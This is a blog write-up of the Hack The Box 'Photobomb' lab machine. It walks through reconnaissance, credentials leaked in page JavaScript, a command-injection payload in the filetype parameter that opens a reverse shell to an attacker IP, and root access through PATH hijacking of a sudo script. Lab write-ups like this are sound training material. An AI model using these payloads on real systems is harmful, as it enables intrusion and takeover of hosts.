<!DOCTYPE html><html lang="en" data-mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Hack The Box - Photobomb" /><meta property="og:locale" content="en" /><meta name="description" content="Just writing my notes here." /><meta property="og:description" content="Just writing my notes here." /><link rel="canonical" href="https://niraj-maharjan.com.np/posts/HAck-the-Box-Photobomb/" /><meta property="og:url" content="https://niraj-maharjan.com.np/posts/HAck-the-Box-Photobomb/" /><meta property="og:site_name" content="Niraj Maharjan" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-12T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Photobomb" /><meta name="twitter:site" content="@NirajjjZzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-12T03:09:45-05:00","datePublished":"2023-02-12T00:00:00-05:00","description":"Just writing my notes here.","headline":"Hack The Box - Photobomb","mainEntityOfPage":{"@type":"WebPage","@id":"https://niraj-maharjan.com.np/posts/HAck-the-Box-Photobomb/"},"url":"https://niraj-maharjan.com.np/posts/HAck-the-Box-Photobomb/"}</script><title>Hack The Box - Photobomb | Niraj Maharjan</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Niraj Maharjan"><meta name="application-name" content="Niraj Maharjan"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/favicons/ms-icon-150x150.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Niraj Maharjan</a></div><div class="site-subtitle font-italic">InfoSec Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://linkedin.com/in/niraj-maharjan" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/nirajmaharz" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NirajjjZzz" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['niraj.maharz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Photobomb</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack The Box - Photobomb</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1676178000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 12, 2023 </em> </span> <span> Updated <em class="" data-ts="1676189385" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 12, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Niraj Maharjan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="778 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/Hackthebox/Photobomb/0.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 90% 70%'%3E%3C/svg%3E" data-src="/assets/Hackthebox/Photobomb/0.png" width="90%" height="70%" class="lazyload" data-proofer-ignore></a></p><p>Photobomb was a easy rated linux box, where plaintext credentials was discovered after viewing the source code. These credentials then lead to a webpage with download  functionality that was vulnerable to blind command injection. User was able to run the script with sudo permission and path hijacking was used to escalate privileges to root.</p><h2 id="recon"><span class="mr-2">RECON</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Initial <code class="language-plaintext highlighter-rouge">nmap</code> scan discoverd ony two ports <code class="language-plaintext highlighter-rouge">22(ssh)</code> and <code class="language-plaintext highlighter-rouge">80(http)</code> open.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nv">$nmap</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.182 <span class="nt">-oN</span> photobomb.nmap 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-02-12 10:39 +0545 
Nmap scan report <span class="k">for </span>10.10.11.182 
Host is up <span class="o">(</span>0.081s latency<span class="o">)</span><span class="nb">.</span> 
Not shown: 65533 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span> 
PORT   STATE SERVICE 
22/tcp open  ssh 
80/tcp open  http 
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.02 seconds 

<span class="nv">$nmap</span> <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span> 10000 10.10.11.182 <span class="nt">-oN</span> photobomb-service.nmap
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-02-12 10:40 +0545 
Nmap scan report <span class="k">for </span>10.10.11.182 
Host is up <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span> 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span> 
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d <span class="o">(</span>RSA<span class="o">)</span> 
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae <span class="o">(</span>ECDSA<span class="o">)</span> 
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e <span class="o">(</span>ED25519<span class="o">)</span> 
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span> 
|_http-title: Did not follow redirect to http://photobomb.htb/ 
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span> 
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span> 
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.25 seconds
</pre></table></code></div></div><h2 id="web-port-80"><span class="mr-2">WEB PORT 80</span><a href="#web-port-80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>on browsing the ip address <code class="language-plaintext highlighter-rouge">http://10.10.11.182</code> it redirects us to <code class="language-plaintext highlighter-rouge">photobomb.htb</code>. so adding it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> <span class="nb">echo</span> <span class="s2">"10.10.11.182 photobomb.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts

<span class="nv">$cat</span> /etc/hosts
10.10.11.182    photobomb.htb
</pre></table></code></div></div><p><a href="/assets/Hackthebox/Photobomb/1.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/1.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>on browsing, <code class="language-plaintext highlighter-rouge">http://photobomb.htb</code> it disaplayed a page containing a link. This link then redirect us to a login portal at <code class="language-plaintext highlighter-rouge">/printer</code>.</p><p><a href="/assets/Hackthebox/Photobomb/2.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/2.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>we tried some default credentails <code class="language-plaintext highlighter-rouge">admin:admin</code> <code class="language-plaintext highlighter-rouge">admin:password</code> but it doesnot seem to work.</p><p>When trying to visit <code class="language-plaintext highlighter-rouge">photobomb.htb/index.html</code> or any other page that doesnot exists, it shows that sinatra does’nt know this ditty.</p><p><a href="/assets/Hackthebox/Photobomb/3.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/3.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="source-code"><span class="mr-2">SOURCE CODE</span><a href="#source-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>viewing the source code of the photobomb.htb, there’s a <code class="language-plaintext highlighter-rouge">photobomb.js</code> and we found some credentials on it.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span> 
  <span class="c1">// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me </span>
  <span class="k">if </span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^</span><span class="se">(</span><span class="sr">.*;</span><span class="se">)?\s</span><span class="sr">*isPhotoBombTechSupport</span><span class="se">\s</span><span class="sr">*=</span><span class="se">\s</span><span class="sr">*</span><span class="se">[^</span><span class="sr">;</span><span class="se">]</span><span class="sr">+</span><span class="se">(</span><span class="sr">.*</span><span class="se">)?</span><span class="sr">$/</span><span class="p">))</span> <span class="p">{</span> 
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">'</span><span class="s1">creds</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">href</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">http://pH0t0:b0Mb!@photobomb.htb/printer</span><span class="dl">'</span><span class="p">);</span> 
  <span class="p">}</span> 
<span class="p">}</span> 
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">init</span><span class="p">;</span>
</pre></table></code></div></div><p>with these creds we can now login to <code class="language-plaintext highlighter-rouge">/printer</code>. After we are logged in, it dispalys a webpage that includes a several images, as well as the ability to specify their dimensions and download them.</p><p><a href="/assets/Hackthebox/Photobomb/4.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/4.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/Hackthebox/Photobomb/5.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/5.png" alt="" class="lazyload" data-proofer-ignore></a></p><h2 id="command-injection"><span class="mr-2">COMMAND INJECTION</span><a href="#command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>while testing for <code class="language-plaintext highlighter-rouge">command injection</code>, when we add <code class="language-plaintext highlighter-rouge">sleep 5</code> on <code class="language-plaintext highlighter-rouge">photo</code> or <code class="language-plaintext highlighter-rouge">dimension</code> parameter we get 500 server error response.</p><p><a href="/assets/Hackthebox/Photobomb/6.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/6.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>But when we add <code class="language-plaintext highlighter-rouge">sleep 5</code> on <code class="language-plaintext highlighter-rouge">filetype</code> parameter we get response after <code class="language-plaintext highlighter-rouge">5400 milisecs</code>, this confirms that there’s a <code class="language-plaintext highlighter-rouge">command injection</code> vulnerability.</p><p><a href="/assets/Hackthebox/Photobomb/7.png" class="popup img-link "><img data-src="/assets/Hackthebox/Photobomb/7.png" alt="" class="lazyload" data-proofer-ignore></a></p><h2 id="shell-as-wizard"><span class="mr-2">SHELL AS WIZARD</span><a href="#shell-as-wizard" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>On replacing <code class="language-plaintext highlighter-rouge">sleep 5</code> with our reverse shell we got shell as <code class="language-plaintext highlighter-rouge">wizard</code> user.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">photo</span><span class="o">=</span>masaaki-komori-NYFaNoiPf7A-unsplash.jpg&amp;filetype<span class="o">=</span>png%3bbash+-c+<span class="s1">'bash+-i+&gt;%26+/dev/tcp/10.10.14.14/4444+0&gt;%261'</span>&amp;dimensions<span class="o">=</span>150x100
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> nc <span class="nt">-lvnp</span> 4444 
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.14] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.182] 55200
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>734<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
wizard@photobomb:~/photobomb<span class="nv">$ </span>
</pre></table></code></div></div><h2 id="shell-as-root"><span class="mr-2">SHELL AS ROOT</span><a href="#shell-as-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>On running <code class="language-plaintext highlighter-rouge">sudo -l</code>, the output shows that the user <code class="language-plaintext highlighter-rouge">wizard</code> can run <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> with <code class="language-plaintext highlighter-rouge">sudo</code> permissions and without password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>wizard@photobomb:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>wizard on photobomb:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User wizard may run the following commands on photobomb:
    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
</pre></table></code></div></div><h3 id="path-hijacking"><span class="mr-2">PATH HIJACKING</span><a href="#path-hijacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h3 id="optcleanupsh"><span class="mr-2">/opt/cleanup.sh</span><a href="#optcleanupsh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We cannot edit the contents of <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> but we can read it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nb">cat</span> /opt/cleanup.sh
<span class="c">#!/bin/bash</span>
<span class="nb">.</span> /opt/.bashrc
<span class="nb">cd</span> /home/wizard/photobomb

<span class="c"># clean up log files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
<span class="k">then</span>
  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
<span class="k">fi</span>

<span class="c"># protect the priceless originals</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
</pre></table></code></div></div><p>On analysing, the cleaup.sh script we can see that there’s a <code class="language-plaintext highlighter-rouge">path hijacking</code>. Here, all the binaries are referenced with the full path except <code class="language-plaintext highlighter-rouge">find</code>. That means, bash will look for binaries in <code class="language-plaintext highlighter-rouge">$PATH</code> and find will run from <code class="language-plaintext highlighter-rouge">/usr/bin/find</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

wizard@photobomb:/tmp<span class="nv">$ </span>which find
/usr/bin/find
</pre></table></code></div></div><p>creating <code class="language-plaintext highlighter-rouge">find</code> file in <code class="language-plaintext highlighter-rouge">/tmp</code> and making it executable.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">pwd</span>
/tmp
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">cat </span>find
<span class="c">#!/bin/bash</span>

bash

wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x find
</pre></table></code></div></div><p>now we can run cleanup.sh with sudo permission but set the PATH variable to /tmp and get a root shell.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb#
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/path-hijack/" class="post-tag no-text-decoration" >path hijack</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a> <a href="/tags/photobomb/" class="post-tag no-text-decoration" >photobomb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Photobomb%20-%20Niraj%20Maharjan&url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHAck-the-Box-Photobomb%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20Photobomb%20-%20Niraj%20Maharjan&u=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHAck-the-Box-Photobomb%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHAck-the-Box-Photobomb%2F&text=Hack%20The%20Box%20-%20Photobomb%20-%20Niraj%20Maharjan" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHAck-the-Box-Photobomb%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hack-The-Box-Authority/">Hack The Box - Authority</a><li><a href="/posts/HAck-the-Box-Photobomb/">Hack The Box - Photobomb</a><li><a href="/posts/Hack-The-Box-Querier/">Hack The Box - Querier</a><li><a href="/posts/Ejptv2/">eLearnSecurity - eJPTv2</a><li><a href="/posts/Hack-The-Box-Hiest/">Hack The Box - Heist</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Hack-The-Box-Shoppy/"><div class="card-body"> <em class="small" data-ts="1676178000" data-df="ll" > Feb 12, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Shoppy</h3><div class="text-muted small"><p> Shoppy was a easy linux machine, which was vulnerable to NOSQL injection. Exploiting NOSQL injection, we  got password hash of all users. After cracking the hash of one user, the Mattermost serve...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Active/"><div class="card-body"> <em class="small" data-ts="1674018000" data-df="ll" > Jan 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Active</h3><div class="text-muted small"><p> RECON NMAP Starting with nmap, nmap shows a bunch of open ports and the target is Active Directory Domain Controller running on Windows Server 2008 R2 SP1. $sudo nmap -sT -p- -oA alltcp 10.10...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Return/"><div class="card-body"> <em class="small" data-ts="1674882000" data-df="ll" > Jan 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Return</h3><div class="text-muted small"><p> Return was an easy box that involved exploiting a printer’s web administration panel to obtain LDAP credentials. These credentials can then be used to access WinRM. The account obtained through t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Hack-The-Box-Querier/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Querier</p></a> <a href="/posts/Hack-The-Box-Shoppy/" class="btn btn-outline-primary" prompt="Newer"><p>Hack The Box - Shoppy</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://niraj-maharjan.com.np/posts/HAck-the-Box-Photobomb/'; this.page.identifier = '/posts/HAck-the-Box-Photobomb/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver( function (entries) { if (entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://nirazzz.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] } ); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* Disqus hasn't been 